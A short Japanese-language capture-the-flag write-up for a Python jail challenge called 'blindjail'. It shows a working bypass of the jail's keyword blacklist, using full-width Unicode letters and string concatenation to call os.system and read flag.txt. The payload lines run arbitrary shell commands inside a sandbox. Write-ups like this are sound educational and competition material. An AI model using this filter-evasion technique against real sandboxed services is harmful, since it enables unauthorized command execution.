# blindjail:misc:50pts
There is no escape, sometimes going in blind makes other attributes stronger.  
`nc 34.100.177.188 1337`  

# Solution
ncでの接続先が渡される。  
```bash
$ nc 34.100.177.188 1337
-------------------------------------------------------------
 WELCOME TO THE BLINDJAIL
 --------------------------------------------------------
  fret not that you cannot see, fret that you cannot leave.
>>> print(1)
1
>>> __import__("os").system("ls")
 Nope,  import  is banned!
>>>
```
pythonのjailのようだが、importなどいくつかのブラックリストがある。  
このような場合、全角と文字列結合でバイパスする。  
```bash
$ nc 34.100.177.188 1337
-------------------------------------------------------------
 WELCOME TO THE BLINDJAIL
 --------------------------------------------------------
  fret not that you cannot see, fret that you cannot leave.
>>> __ｉｍｐｏｒｔ__("o"+"s").ｓｙｓｔｅｍ("ls")
flag.txt
main.py
>>> __ｉｍｐｏｒｔ__("o"+"s").ｓｙｓｔｅｍ('c'+'at f'+'lag.txt')
nitectf{sl1d3_0ver_th3se_4ttribut3s}
```
flagが得られた。  

## nitectf{sl1d3_0ver_th3se_4ttribut3s}